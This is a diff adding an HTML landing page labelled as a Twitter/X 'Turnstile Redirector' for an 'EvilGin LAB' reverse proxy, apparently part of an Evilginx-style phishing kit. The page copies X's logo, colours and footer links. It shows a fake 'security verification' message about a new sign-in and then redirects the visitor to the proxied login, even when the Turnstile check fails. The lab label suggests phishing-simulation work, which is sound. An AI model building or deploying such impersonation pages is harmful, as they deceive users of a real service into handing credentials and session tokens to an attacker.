@@ -1,0 +1,177 @@
+<!-- Twitter/X Turnstile Redirector for EvilGin LAB RProxy -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - X</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico" type="image/x-icon">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        .container {
+            background: #16181c;
+            padding: 48px 40px;
+            border-radius: 16px;
+            border: 1px solid #2f3336;
+            text-align: center;
+            max-width: 440px;
+            width: 100%;
+        }
+        .x-logo {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 32px;
+            fill: #ffffff;
+        }
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #71767a;
+            margin-bottom: 32px;
+            line-height: 20px;
+        }
+        .security-info {
+            background: #000000;
+            border: 1px solid #2f3336;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            border-radius: 12px;
+        }
+        .security-info h2 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        .security-info p {
+            font-size: 15px;
+            color: #71767a;
+            line-height: 20px;
+            margin: 0;
+        }
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #2f3336;
+            border-top-color: #1d9bf0;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text {
+            font-size: 15px;
+            color: #71767a;
+        }
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #2f3336;
+            font-size: 13px;
+            color: #71767a;
+        }
+        .footer a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        #cf-turnstile { display: none; }
+        @media (max-width: 480px) {
+            .container { margin: 16px; padding: 32px 24px; }
+            h1 { font-size: 24px; }
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <svg class="x-logo" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+        <h1>Security verification</h1>
+        <div class="subtitle">We need to verify your identity to keep your account secure.</div>
+        <div class="security-info">
+            <h2>Why am I seeing this?</h2>
+            <p>You're signing in from a new location or device. This extra security step helps protect your account.</p>
+        </div>
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        <noscript><p style="color: #f4212e;">JavaScript is required.</p></noscript>
+        <div id="cf-turnstile"></div>
+        <div style="margin-top: 30px;">
+            <a id="manual-redirect-btn" href="#" onclick="performManualRedirect(); return false;" style="display: inline-block; padding: 12px 24px; background: #ffffff; color: #000000; text-decoration: none; border-radius: 20px; font-size: 15px; font-weight: 700;">Continue to X</a>
+        </div>
+        <div class="footer">
+            <a href="https://twitter.com/privacy" target="_blank">Privacy</a> • 
+            <a href="https://twitter.com/tos" target="_blank">Terms</a>
+        </div>
+    </div>
+    <script>
+        const TURNSTILE_SITEKEY = 'YOUR_TURNSTILE_SITE_KEY';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        function performRedirect() { window.location.href = REDIRECT_URL; }
+        function performManualRedirect() { if (REDIRECT_URL) window.location.href = REDIRECT_URL; }
+        if (typeof turnstile === 'undefined') {
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout = setTimeout(function() {
+                    document.querySelector('.status-text').textContent = 'Completing verification...';
+                    setTimeout(performRedirect, 500);
+                }, 5000);
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                var btn = document.getElementById('manual-redirect-btn');
+                if (btn) btn.href = REDIRECT_URL;
+                try { window.location.href = REDIRECT_URL; } catch (e) { window.location = REDIRECT_URL; }
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
